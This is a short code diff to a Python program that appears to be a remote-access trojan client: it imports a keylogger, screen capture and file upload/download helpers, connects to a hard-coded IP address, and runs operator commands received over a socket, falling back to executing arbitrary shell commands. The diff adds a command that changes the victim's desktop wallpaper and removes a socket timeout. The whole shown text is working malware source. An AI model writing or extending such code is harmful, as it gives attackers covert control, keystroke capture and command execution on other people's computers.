@@ -22,6 +22,7 @@ from mss import mss
 import numpy as np
 import psutil
 from filetarget import download_file, upload_file
+import ctypes
 
 ip = '192.168.18.198'
 main_log1 = threading.Event()
@@ -29,9 +30,17 @@ logger = Keylogger()
 is_locked_cursor = False
 is_locked_keyboard = False
 
+def change_wallpaper(sok, cmd: str):
+    try:
+        cmd = cmd.split()
+        abs_path = os.path.abspath(cmd[1].strip())
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
+        sok.sendall(f"[+] Changed wallpaper to {abs_path}".encode())
+    except Exception as e:
+        sok.sendall(f"[-] Error: {e}".encode())
+
 def get_pid(sok):
     try:
-        sok.settimeout(3.0)
         cur_pid = os.getpid()
         cur_pid = str(cur_pid).encode()
         sok.sendall(cur_pid)
@@ -451,6 +460,8 @@ def jalankan_perintah(sok):
             get_pid(sok)
         elif perintah.startswith("ui"):
             move_cursor(sok)
+        elif perintah.startswith("set_wallpaper"):
+            change_wallpaper(sok, perintah)
         else:
             exe = subprocess.Popen(
             perintah,
